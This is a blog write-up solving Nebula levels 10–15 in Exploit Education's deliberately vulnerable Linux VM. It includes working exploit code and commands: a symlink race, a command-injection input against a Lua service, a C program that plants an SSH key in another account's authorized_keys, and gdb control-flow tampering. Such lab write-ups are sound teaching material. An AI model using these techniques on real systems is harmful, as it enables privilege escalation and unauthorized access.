<!DOCTYPE html>
<html>

  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">

  <title>Exploit Education - Nebula: Write-up (Part 2)</title>
  <meta name="description" content="Write-ups for all the nebula challenges included in the VM created by exploit education. Nebula covers a variety of simple and intermediate challenges that c...">
  <meta name="author" content="Zijun Hui">
  <meta name="keywords" content="exploit education, nebula, solution, tip, answer, ctf">

  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Exploit Education - Nebula: Write-up (Part 2)">
  <meta name="twitter:description" content="Write-ups for all the nebula challenges included in the VM created by exploit education. Nebula covers a variety of simple and intermediate challenges that c...">
  <meta name="twitter:keywords" content="exploit education, nebula, solution, tip, answer, ctf">

  <meta property="og:type" content="article">
  <meta property="og:title" content="Exploit Education - Nebula: Write-up (Part 2)">
  <meta property="og:description" content="Write-ups for all the nebula challenges included in the VM created by exploit education. Nebula covers a variety of simple and intermediate challenges that c...">
  <meta name="og:keywords" content="exploit education, nebula, solution, tip, answer, ctf">

  <link rel="icon" type="image/png" href="/assets/images/favicon.png" />
  <link href="/assets/images/favicon.png" rel="shortcut icon" type="image/png">
  
  <link rel="stylesheet" href="/css/main.css">
  <link href="//netdna.bootstrapcdn.com/font-awesome/4.1.0/css/font-awesome.min.css" rel="stylesheet">
  <link href="https://fonts.googleapis.com/css?family=Montserrat" rel="stylesheet"> 

  <link rel="canonical" href="zijunh.github.io/2019/06/nebulla-part-2/">
  <link rel="alternate" type="application/rss+xml" title="Zijun Hui" href="zijunh.github.io/feed.xml">
  
  <meta name="google-site-verification" content="1-1ZlHoRvM0T2FqPbW2S-qLgYXN6rsn52kErlMPd_gw" />
  
</head>


  <body>

    <span class="mobile btn-mobile-menu">
        <i class="fa fa-list btn-mobile-menu__icon"></i>
        <i class="fa fa-angle-up btn-mobile-close__icon hidden"></i>
    </span>
    
    <header class="panel-cover panel-cover--collapsed" style="background-image: url('/assets/images/background-cover.jpg')">
  <div class="panel-main">

    <div class="panel-main__inner panel-inverted">
    <div class="panel-main__content">
        <a href="/" title="Go to Zijun Hui's page" class="blog-button"><img src="/assets/images/avatar.jpg" width="80" alt="Zijun Hui logo" class="panel-cover__logo logo" /></a>
        <h1 class="panel-cover__title panel-title"><a href="/" title="Link to homepage for Zijun Hui" class="blog-button">Zijun Hui</a></h1>
        
        <span class="panel-cover__subtitle panel-subtitle">Doing what I like</span>
        
        <hr class="panel-cover__divider" />
        <p class="panel-cover__description">Random thoughts and random solutions on computer science</p>
        <hr class="panel-cover__divider panel-cover__divider--secondary" />
        
        
        <p class="panel-cover__description">Welcome to my world</p>
        
        
        <div class="navigation-wrapper">
          <div>
            <nav class="cover-navigation cover-navigation--primary">
              <ul class="navigation">
                <li class="navigation__item"><a href="/#blog" title="Visit blog" class="blog-button">Home</a></li>
                
                  <li class="navigation__item"><a href="/categories.html#blog" title="Categoies">Categories</a></li>
                
                
              </ul>
            </nav>
          </div>
          
          <div><nav class="cover-navigation navigation--social">
  <ul class="navigation">

  

  
  <!-- Github -->
  <li class="navigation__item">
    <a href="https://github.com/ZijunH" title="@ZijunH 的 Github" target="_blank">
      <i class='social fa fa-github'></i>
      <span class="label">Github</span>
    </a>
  </li>
  
  
  

  

  <!-- RSS -->
  <li class="navigation__item">
    <a href="/feed.xml" rel="author" title="RSS" target="_blank">
      <i class='social fa fa-rss'></i>
      <span class="label">RSS</span>
    </a>
  </li>

  
  <!-- Email -->
  <li class="navigation__item">
    <a href="mailto:allenhui1220@outlook.com" title="Contact me">
      <i class='social fa fa-envelope'></i>
      <span class="label">Email</span>
    </a>
  </li>
  

  </ul>
</nav>
</div>
        </div>
      </div>
    </div>
    
    
    <div class="panel-cover--overlay cover-red"></div>
    
  </div>
</header>


    <div class="content-wrapper">
        <div class="content-wrapper__inner">
            <article class="post-container post-container--single" itemscope itemtype="http://schema.org/BlogPosting">
  <header class="post-header">
    <div class="post-meta">
      <time datetime="2019-06-25 23:44:38 +1000" itemprop="datePublished" class="post-meta__date date">2019-06-25</time> &#8226; <span class="post-meta__tags tags">exploit education, solution, nebula</span>
    </div>
    <h1 class="post-title">Exploit Education - Nebula: Write-up (Part 2)</h1>
  </header>

  <section class="post">
    <h2 id="introduction">Introduction</h2>

<p>As the challenges are relatively short, I will be slowly updating this post will the ones I have completed. The VM can be obtained at <a href="https://exploit.education/nebula/">Exploit Education</a>, a website created by Andrew Griffiths that teaches common (and less than common) weaknesses and vulnerabilities in Linux.</p>

<p>The main purpose of each level is to bypass certain restrictions imposed by the system, and run <code class="highlighter-rouge">getflag</code> with the required privileges (pwn).</p>

<h2 id="level10">Level10</h2>

<p>Inspecting the home directory of <code class="highlighter-rouge">level10</code>, one may find a curious file names “x”. Within the file, the password to the <code class="highlighter-rouge">flag10</code> account is stored. I assumed this was an unintended error as it would make this challenge boring. Thus, I ignored this file.</p>

<p>The home directory of <code class="highlighter-rouge">flag10</code> contains 2 files: a <code class="highlighter-rouge">token</code> file, which we do not have read permissions, and an executable with its source code provided online.</p>

<p>Inspecting the source code, the first thing I noticed was that the check by <code class="highlighter-rouge">access</code> is performed pre-maturely compared to the <code class="highlighter-rouge">open</code>. The timing difference is exaggerated by the <code class="highlighter-rouge">write</code> to a socket, which is known to take a long time. This increases the chance of a race condition, where we can abuse this delay to bypass the initial check. This is confirmed by the <a href="http://man7.org/linux/man-pages/man2/access.2.html">man page for access</a>, which specifies “…creates a security hole, because the user might exploit the short time interval between checking and opening the file to manipulate it.”</p>

<p>In order to abuse the delay, we can swap the contents of the files we want to check. Initially, it may be a normal file, but it can be swapped to a symbolic link to the target file “token”. This is done by the command <code class="highlighter-rouge">ln -fs /home/flag10/token foo.txt</code>. As the socket is created on port 18211, a keep-alive socket listener is required; it can be created by <code class="highlighter-rouge">netcat -kl 18211 &amp;&gt; out.txt &amp;</code>. The last “&amp;” indicates it runs in the background. To abuse the race condition, 2 terminals will be needed: one to repeatedly run the “flag10” executable by <code class="highlighter-rouge">while :; do /home/flag10/flag10 foo.txt 127.0.0.1; done</code>, and another to swap the original “foo.txt” to a symlink. We hope the timing is correct, and “out.txt” can be checked. If “out.txt” does not contain the required string, then the above process needs to be repeated.</p>

<p>Personally, I got the desired string - “615a2ce1-b2b5-4c76-8eed-8aa5c4015c27” - on my second try.</p>

<h2 id="level11">Level11</h2>

<p>This level is rather interesting, as I suspect it is not performing as it is intended. Though I have devised a method that performs <code class="highlighter-rouge">getflag</code> successfully, it is rather convoluted compared to the most obvious method. That method does spawn a shell, but it has insufficient privileges.</p>

<p>The level provides the source code for a binary with the “setuid” bit on.</p>

<h3 id="method-1">Method 1</h3>

<p>Inspecting the source code, it appears there is a <code class="highlighter-rouge">system</code> call within the <code class="highlighter-rouge">process</code> function. To trigger the <code class="highlighter-rouge">process</code> function, the first line of input must start with “Content-Length: xxxx”, where “xxx” is a valid integer. Then, the integer is parsed, and an <code class="highlighter-rouge">if</code> function separates the program into 2 cases: one where the integer is smaller than 1024, and one where it is not. Interestingly, the case when the integer is smaller than 1024 only works when the integer is 1. This is indicated by the line <code class="highlighter-rouge">fread(buf, length, 1, stdin) != length</code>. <code class="highlighter-rouge">fread</code> returns the number of elements read. The size of each element is indicated by the second argument and the number of each element is limited by hte third argument. As the third argument is “1”, the inequality will only hold true when the “length” is 1. With only 1 character under ur control, what I could have done is severely limited. Thus, I mainly focused on the second case.</p>

<p>The second case occurs when the inputted integer is larger or equal to 1024. In that case, a random file is generated by <code class="highlighter-rouge">getrand</code> and the program essentially reads “length” number of characters from the buffer. The characters are then processed by the <code class="highlighter-rouge">process</code> function and the message is executed by <code class="highlighter-rouge">system</code>.</p>

<p>Reversing the process/encryption is rather simple, as we can use the fact that (a ^ b) ^ b == a. As <code class="highlighter-rouge">k</code> changes after each character is processed, it is easy to reverse engineer it. After some math, the following python code was written to decrypt the code:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">def</span> <span class="nf">dc</span><span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="n">l</span><span class="p">):</span>
    <span class="n">a</span> <span class="o">=</span> <span class="s">""</span>
    <span class="n">k</span> <span class="o">=</span> <span class="n">l</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">b</span><span class="p">)):</span>
        <span class="n">a</span> <span class="o">+=</span> <span class="nb">chr</span><span class="p">((</span><span class="nb">ord</span><span class="p">(</span><span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">^</span> <span class="n">k</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0xff</span><span class="p">)</span>
        <span class="n">k</span> <span class="o">=</span> <span class="p">(</span><span class="n">k</span> <span class="o">-</span> <span class="nb">ord</span><span class="p">(</span><span class="n">b</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span> <span class="o">&amp;</span> <span class="mh">0xff</span>
    <span class="k">return</span> <span class="n">a</span>
</code></pre></div></div>

<p>Thus, we can manipulate the information that goes into <code class="highlighter-rouge">system</code>. I intended to have an input of “getflag\00”. The null terminator is required to finish the input. As a length of at least 1024 is required, the remaining bytes of the input can be padded by some junk character. This is summarised as follows:</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">__future__</span> <span class="kn">import</span> <span class="n">print_function</span>
<span class="k">def</span> <span class="nf">p</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">):</span>
    <span class="k">print</span><span class="p">(</span><span class="o">*</span><span class="n">args</span><span class="p">,</span> <span class="n">end</span><span class="o">=</span><span class="s">""</span><span class="p">)</span>
<span class="n">cm</span> <span class="o">=</span> <span class="s">"getflag</span><span class="se">\x00</span><span class="s">"</span>
<span class="k">print</span><span class="p">(</span><span class="s">"Content-Length: </span><span class="si">%</span><span class="s">d"</span> <span class="o">%</span> <span class="p">(</span><span class="mi">1024</span><span class="p">))</span>
<span class="n">p</span><span class="p">(</span><span class="n">dc</span><span class="p">(</span><span class="n">cm</span><span class="p">,</span> <span class="mi">1024</span><span class="p">))</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1024</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">cm</span><span class="p">)):</span>
    <span class="n">p</span><span class="p">(</span><span class="s">"A"</span><span class="p">)</span>
</code></pre></div></div>

<p>Before executing, notice <code class="highlighter-rouge">getrand</code> requires and environmental variable “TEMP”. This is often not set on the system, and I simply set it to “/tmp” by <code class="highlighter-rouge">export TEMP=/tmp</code>.</p>

<p>However, when it is executed, the program indicates we did not obtain the flag. Further inspection by <code class="highlighter-rouge">strace</code> reveals that the effective uid was reverted to the original just before the system call.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level11@nebula:~<span class="nv">$ </span>python py.py | /home/flag11/flag11
blue <span class="o">=</span> 1024, length <span class="o">=</span> 1024, pink <span class="o">=</span> 1024
getflag is executing on a non-flag account, this doesn<span class="se">\'</span>t count
level11@nebula:~<span class="nv">$ </span>python py.py | strace /home/flag11/flag11
...
getgid32<span class="o">()</span>                              <span class="o">=</span> 1012
setgid32<span class="o">(</span>1012<span class="o">)</span>                          <span class="o">=</span> 0
getuid32<span class="o">()</span>                              <span class="o">=</span> 1012
setuid32<span class="o">(</span>1012<span class="o">)</span>                          <span class="o">=</span> 0
...
</code></pre></div></div>

<p>I believe this is an unintended error, as this essentially blocks out all attacks that utilise <code class="highlighter-rouge">system</code>.</p>

<h3 id="method-2">Method 2</h3>

<p>Fortunately, I have devised an alternative method. Observe the escalated permissions are only revoked just before the <code class="highlighter-rouge">system</code> call. Before that, another function that we can abuse is <code class="highlighter-rouge">write(fd, buf, pink)</code>. Through “fd” is determined by the random generator <code class="highlighter-rouge">getrand</code>, the file name that is generated can be estimated. It uses pid, which can be easily determined, and <code class="highlighter-rouge">time(NULL)</code>, whose resolution is only to hte nearest second. I can then create the predicted file beforehand, and symlink it to a file I want to overwrite (or create).</p>

<p>Now, I had to determine a target file to write. Looking around the home folder of “flag11”, I found a “.ssh” folder. There are 2 ways to connect using SSH: using a password or using an authorised key. Coincidentally, the authorised keys are stored in the “.ssh” folder’s “authorized_keys” files. Thus, if I can place the key of “level11” in the file, I can SSH into “flag11” without a password, and gain escalated privileges.</p>

<p>To generate a key for “level11”, I used <code class="highlighter-rouge">ssh-keygen -t rsa</code> with default values. This creates a “id_rsa.pub” file, which contains the required keys.</p>

<p>To predict the temporary filename, I use the fact that 2 executables that run consecutively have a pid difference of 1 and the first executable will execute in less than 1 second given the program is simple and the machine is fast. Using the above 2 facts, I created the following C file that pre-creates a file and symlinks it to “/home/flag11/.ssh/authorized_keys”. Note that running this file will cause the executable to end pre-maturely as the required input length was not reached, but at this point the file contents have already been written so it does not matter. Replace <code class="highlighter-rouge">buffer</code> with whatever is in the “id_rsa.pub” file. In this case, encryption/processing is not needed as that is required for <code class="highlighter-rouge">system</code> only.</p>

<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdlib.h&gt;
#include &lt;unistd.h&gt;
#include &lt;string.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;fcntl.h&gt;
#include &lt;stdio.h&gt;
#include &lt;sys/mman.h&gt;
</span>
<span class="kt">int</span> <span class="n">getrand</span><span class="p">(</span><span class="kt">char</span> <span class="o">**</span><span class="n">path</span><span class="p">,</span> <span class="kt">int</span> <span class="n">pid</span><span class="p">,</span> <span class="kt">int</span> <span class="n">time</span><span class="p">){</span>
    <span class="kt">int</span> <span class="n">fd</span> <span class="o">=</span>  <span class="mi">0</span><span class="p">;</span>
    <span class="n">srandom</span><span class="p">(</span><span class="n">time</span><span class="p">);</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">tmp</span> <span class="o">=</span> <span class="n">getenv</span><span class="p">(</span><span class="s">"TEMP"</span><span class="p">);</span>
    <span class="n">asprintf</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="s">"%s/%d.%c%c%c%c%c%c"</span><span class="p">,</span> <span class="n">tmp</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span>
      <span class="sc">'A'</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">26</span><span class="p">),</span> <span class="sc">'0'</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">10</span><span class="p">),</span>
      <span class="sc">'a'</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">26</span><span class="p">),</span> <span class="sc">'A'</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">26</span><span class="p">),</span>
      <span class="sc">'0'</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">10</span><span class="p">),</span> <span class="sc">'a'</span> <span class="o">+</span> <span class="p">(</span><span class="n">random</span><span class="p">()</span> <span class="o">%</span> <span class="mi">26</span><span class="p">));</span>
    <span class="k">return</span> <span class="n">fd</span><span class="p">;</span>
<span class="p">}</span>

<span class="cp">#define CL "Content-Length: "
</span>
<span class="kt">int</span> <span class="n">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">char</span> <span class="n">line</span><span class="p">[</span><span class="mi">256</span><span class="p">];</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">10000</span><span class="p">]</span> <span class="o">=</span> <span class="s">"..."</span><span class="p">;</span>
    <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">pid</span> <span class="o">=</span> <span class="n">getpid</span><span class="p">()</span><span class="o">+</span><span class="mi">1</span><span class="p">;</span>
    <span class="n">getrand</span><span class="p">(</span><span class="o">&amp;</span><span class="n">path</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="n">time</span><span class="p">(</span><span class="nb">NULL</span><span class="p">));</span>
    <span class="n">symlink</span><span class="p">(</span><span class="s">"/home/flag11/.ssh/authorized_keys"</span><span class="p">,</span><span class="n">path</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span> <span class="s">"%s%d</span><span class="se">\n</span><span class="s">%s"</span><span class="p">,</span><span class="n">CL</span><span class="p">,</span><span class="k">sizeof</span><span class="p">(</span><span class="n">buffer</span><span class="p">),</span><span class="n">buffer</span><span class="p">);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</code></pre></div></div>

<p>Using this method, I simply SSHed into flag11’s account by <code class="highlighter-rouge">ssh flag11@127.0.0.1</code>, concluding this level.</p>

<h2 id="level12">Level12</h2>

<p>This is a simple problem. The lua script did not sanitise the input received, thus allowing arbitrary code execution during the step <code class="highlighter-rouge">io.popen("echo "..password.." | sha1sum", "r")</code>. To connect to the listening process, we can use <code class="highlighter-rouge">telnet hostname port</code>, which would be <code class="highlighter-rouge">telnet 127.0.0.1 50001</code> in this case. This allows a connection to the listening process. Then, we can design our input to suit the bash code above; I picked “a;getflag &gt; /tmp/a.txt; echo a”, which redirects the output of <code class="highlighter-rouge">getflag</code> to the file “/tmp/a.txt”, allowing us to check the results of the code execution. This successfully obtains the flag, and the full process is described below:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level12@nebula:~<span class="nv">$ </span>telnet 127.0.0.1 50001
Trying 127.0.0.1...
Connected to 127.0.0.1.
Escape character is <span class="s1">'^]'</span><span class="nb">.</span>
Password: a<span class="p">;</span> getflag <span class="o">&gt;</span> /tmp/a.txt<span class="p">;</span> <span class="nb">echo </span>a
Better luck next <span class="nb">time
</span>Connection closed by foreign host.
level12@nebula:~<span class="nv">$ </span><span class="nb">cat</span> /tmp/a.txt
You have successfully executed getflag on a target account
</code></pre></div></div>

<h2 id="level13">Level13</h2>

<p>The program is quite simple and rigid and there appears to be no problem with the binary itself. However, as we have control of the program environment as well, it is easy to manipulate the state of the binary. This can be done using a debugger, specifically gdb.</p>

<p>Using gdb, we are able to bypass the <code class="highlighter-rouge">if</code> statement and thus prevent the early exit of the program. I broke the program <code class="highlighter-rouge">main</code>, and printed the disassembled code. Using that, I determined the location of the <code class="highlighter-rouge">if</code> statement, and overwrote “eip” (instruction pointer) with the address the statement jumps to when <code class="highlighter-rouge">getuid()</code> is equal to 1000. This process is described below:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level13@nebula:~$ gdb /home/flag13/flag13
GNU gdb (Ubuntu/Linaro 7.3-0ubuntu2) 7.3-2011.08
Copyright (C) 2011 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
For bug reporting instructions, please see:
&lt;http://bugs.launchpad.net/gdb-linaro/&gt;...
Reading symbols from /home/flag13/flag13...(no debugging symbols found)...done.
(gdb) break main
Breakpoint 1 at 0x80484c9
(gdb) r
Starting program: /home/flag13/flag13

Breakpoint 1, 0x080484c9 in main ()
(gdb) x/29 main
   0x80484c4 &lt;main&gt;:    push   %ebp
   0x80484c5 &lt;main+1&gt;:  mov    %esp,%ebp
   0x80484c7 &lt;main+3&gt;:  push   %edi
   0x80484c8 &lt;main+4&gt;:  push   %ebx
=&gt; 0x80484c9 &lt;main+5&gt;:  and    $0xfffffff0,%esp
   0x80484cc &lt;main+8&gt;:  sub    $0x130,%esp
   0x80484d2 &lt;main+14&gt;: mov    0xc(%ebp),%eax
   0x80484d5 &lt;main+17&gt;: mov    %eax,0x1c(%esp)
   0x80484d9 &lt;main+21&gt;: mov    0x10(%ebp),%eax
   0x80484dc &lt;main+24&gt;: mov    %eax,0x18(%esp)
   0x80484e0 &lt;main+28&gt;: mov    %gs:0x14,%eax
   0x80484e6 &lt;main+34&gt;: mov    %eax,0x12c(%esp)
   0x80484ed &lt;main+41&gt;: xor    %eax,%eax
   0x80484ef &lt;main+43&gt;: call   0x80483c0 &lt;getuid@plt&gt;
   0x80484f4 &lt;main+48&gt;: cmp    $0x3e8,%eax
   0x80484f9 &lt;main+53&gt;: je     0x8048531 &lt;main+109&gt;
   0x80484fb &lt;main+55&gt;: call   0x80483c0 &lt;getuid@plt&gt;
   0x8048500 &lt;main+60&gt;: mov    $0x80486d0,%edx
   0x8048505 &lt;main+65&gt;: movl   $0x3e8,0x8(%esp)
   0x804850d &lt;main+73&gt;: mov    %eax,0x4(%esp)
   0x8048511 &lt;main+77&gt;: mov    %edx,(%esp)
   0x8048514 &lt;main+80&gt;: call   0x80483a0 &lt;printf@plt&gt;
   0x8048519 &lt;main+85&gt;: movl   $0x804870c,(%esp)
   0x8048520 &lt;main+92&gt;: call   0x80483d0 &lt;puts@plt&gt;
   0x8048525 &lt;main+97&gt;: movl   $0x1,(%esp)
   0x804852c &lt;main+104&gt;:        call   0x80483f0 &lt;exit@plt&gt;
   0x8048531 &lt;main+109&gt;:        lea    0x2c(%esp),%eax
   0x8048535 &lt;main+113&gt;:        mov    %eax,%ebx
   0x8048537 &lt;main+115&gt;:        mov    $0x0,%eax
(gdb) break *0x80484f9
Breakpoint 2 at 0x80484f9
(gdb) c
Continuing.

Breakpoint 2, 0x080484f9 in main ()
(gdb) set $eip = 0x8048531
(gdb) c
Continuing.
your token is b705702b-76a8-42b0-8844-3adabbe5ac58
[Inferior 1 (process 1637) exited with code 063]
</code></pre></div></div>

<p>Using the token, I am able to log into “flag13” and execute <code class="highlighter-rouge">getflag</code>.</p>

<h2 id="level14">Level14</h2>

<p>This level is rather trivial. The file “token” contains the string “857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW.”, which should be the result after applying the encryption from the executable. Playing around with the executable, you may notice the first character is always the same in both encrypted and unencrypted text. Furthermore, the second character always differs by 1. From this, I hypothesised that the executable increments the character by its position in the string. This is verified (to an extent) by the following:</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level14@nebula:/home/flag14<span class="nv">$ </span>./flag14 <span class="nt">-e</span>
aaaaaaaaaa
abcdefghij
</code></pre></div></div>

<p>From this point, we can create a python script that reverses the encryption. Running the following script results in “8457c118-887c-4e40-a5a6-33a25353165”, which is the password for “flag14”. We can then execute <code class="highlighter-rouge">getflag</code> successfully.</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">s</span> <span class="o">=</span> <span class="s">"857:g67?5ABBo:BtDA?tIvLDKL{MQPSRQWW."</span>
<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)):</span>
    <span class="k">print</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">s</span><span class="p">[</span><span class="n">i</span><span class="p">])</span> <span class="o">-</span> <span class="n">i</span><span class="p">),</span> <span class="n">end</span><span class="o">=</span><span class="s">""</span><span class="p">)</span>
</code></pre></div></div>

<h2 id="level15">Level15</h2>

<p>Following the hint, I ran <code class="highlighter-rouge">strace /home/flag15/flag15</code>, and the following results popped up:</p>

<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>level15@nebula:~$ strace /home/flag15/flag15
execve("/home/flag15/flag15", ["/home/flag15/flag15"], [/* 18 vars */]) = 0
brk(0)                                  = 0x859a000
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
mmap2(NULL, 8192, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7799000
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686/sse2/cmov", 0xbfa0c344) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686/sse2", 0xbfa0c344) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686/cmov", 0xbfa0c344) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/i686/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/i686", 0xbfa0c344) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/sse2/cmov", 0xbfa0c344) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/sse2", 0xbfa0c344) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls/cmov", 0xbfa0c344) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/tls/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/tls", 0xbfa0c344) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/i686/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/i686/sse2/cmov", 0xbfa0c344) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/i686/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/i686/sse2", 0xbfa0c344) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/i686/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/i686/cmov", 0xbfa0c344) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/i686/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/i686", 0xbfa0c344) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/sse2/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/sse2/cmov", 0xbfa0c344) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/sse2/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/sse2", 0xbfa0c344) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/cmov/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15/cmov", 0xbfa0c344) = -1 ENOENT (No such file or directory)
open("/var/tmp/flag15/libc.so.6", O_RDONLY) = -1 ENOENT (No such file or directory)
stat64("/var/tmp/flag15", {st_mode=S_IFDIR|0775, st_size=40, ...}) = 0
open("/etc/ld.so.cache", O_RDONLY)      = 3
fstat64(3, {st_mode=S_IFREG|0644, st_size=33815, ...}) = 0
mmap2(NULL, 33815, PROT_READ, MAP_PRIVATE, 3, 0) = 0xb7790000
close(3)                                = 0
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/i386-linux-gnu/libc.so.6", O_RDONLY) = 3
read(3, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0p\222\1\0004\0\0\0"..., 512) = 512
fstat64(3, {st_mode=S_IFREG|0755, st_size=1544392, ...}) = 0
mmap2(NULL, 1554968, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 3, 0) = 0xbf3000
mmap2(0xd69000, 12288, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x176) = 0xd69000
mmap2(0xd6c000, 10776, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0) = 0xd6c000
close(3)                                = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb778f000
set_thread_area({entry_number:-1 -&gt; 6, base_addr:0xb778f8d0, limit:1048575, seg_32bit:1, contents:0, read_exec_only:0, limit_in_pages:1, seg_not_present:0, useable:1}) = 0
mprotect(0xd69000, 8192, PROT_READ)     = 0
mprotect(0x8049000, 4096, PROT_READ)    = 0
mprotect(0x32f000, 4096, PROT_READ)     = 0
munmap(0xb7790000, 33815)               = 0
fstat64(1, {st_mode=S_IFCHR|0620, st_rdev=makedev(136, 0), ...}) = 0
mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0) = 0xb7798000
write(1, "strace it!\n", 11strace it!
)            = 11
exit_group(11)                          = ?
</code></pre></div></div>

